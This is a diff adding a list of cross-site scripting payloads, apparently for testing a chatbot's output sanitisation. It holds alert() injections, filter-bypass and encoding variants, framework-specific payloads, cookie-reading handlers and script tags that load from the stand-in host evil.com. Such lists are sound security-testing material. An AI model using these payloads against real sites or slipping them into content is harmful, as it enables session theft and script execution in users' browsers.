@@ -1,0 +1,120 @@
+# Cross-Site Scripting (XSS) Payloads
+# XSS payloads for testing chatbot security
+
+# Basic script injection
+<script>alert('XSS')</script>
+<script>alert("XSS")</script>
+<script>alert(`XSS`)</script>
+<script>confirm('XSS')</script>
+<script>prompt('XSS')</script>
+
+# Event handlers
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+<iframe src=javascript:alert('XSS')></iframe>
+<input onfocus=alert('XSS') autofocus>
+<select onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert('XSS') autofocus>
+<keygen onfocus=alert('XSS') autofocus>
+
+# Media elements
+<video><source onerror=alert('XSS')>
+<audio src=x onerror=alert('XSS')>
+<embed src=javascript:alert('XSS')>
+<object data=javascript:alert('XSS')>
+
+# HTML5 elements
+<details open ontoggle=alert('XSS')>
+<marquee onstart=alert('XSS')>
+<meter onmouseover=alert('XSS')>
+<progress onmouseover=alert('XSS')>
+
+# JavaScript URLs
+javascript:alert('XSS')
+javascript:confirm('XSS')
+javascript:prompt('XSS')
+
+# Breaking out of attributes
+'><script>alert('XSS')</script>
+"><script>alert('XSS')</script>
+</script><script>alert('XSS')</script>
+
+# Case variations
+<ScRiPt>alert('XSS')</ScRiPt>
+<SCRIPT>alert('XSS')</SCRIPT>
+<script>Alert('XSS')</script>
+
+# Alternative alert methods
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>alert(/XSS/)</script>
+<script>alert`XSS`</script>
+<script>window['alert']('XSS')</script>
+<script>top['alert']('XSS')</script>
+
+# External script sources
+<script src=//evil.com/xss.js></script>
+<script src=http://evil.com/xss.js></script>
+<script src=https://evil.com/xss.js></script>
+
+# Nested tags
+<<SCRIPT>alert('XSS');//<</SCRIPT>
+<script<script>alert('XSS')</script>
+
+# IMG tag variations
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=`javascript:alert("XSS")`>
+
+# Mouse events
+<a onmouseover="alert(document.cookie)">XSS link</a>
+<a onmouseover=alert(document.cookie)>XSS link</a>
+<div onmouseover=alert('XSS')>Hover me</div>
+
+# Malformed tags
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+
+# HTML entity encoding
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+
+# Tab and newline variations
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+
+# Filter bypass attempts
+<svg/onload=alert('XSS')>
+<iframe/src=javascript:alert('XSS')>
+<img/src=x/onerror=alert('XSS')>
+
+# Data URLs
+<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
+<object data="data:text/html,<script>alert('XSS')</script>"></object>
+
+# CSS injection
+<style>@import'javascript:alert("XSS")';</style>
+<link rel=stylesheet href=javascript:alert('XSS')>
+
+# Form-based XSS
+<form><button formaction=javascript:alert('XSS')>Click me</button></form>
+<input type=image src=x onerror=alert('XSS')>
+
+# Template injection attempts
+{{alert('XSS')}}
+${alert('XSS')}
+#{alert('XSS')}
+<%= alert('XSS') %>
+
+# AngularJS specific
+{{constructor.constructor('alert("XSS")')()}}
+<div ng-app ng-csp><input ng-focus=$event.view.alert('XSS') autofocus>
+
+# React specific
+<img src=x onerror={alert('XSS')} />
+<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert("XSS")>'}} />
+
+# Vue.js specific
+<div v-html="'<img src=x onerror=alert(\"XSS\")>'"></div>
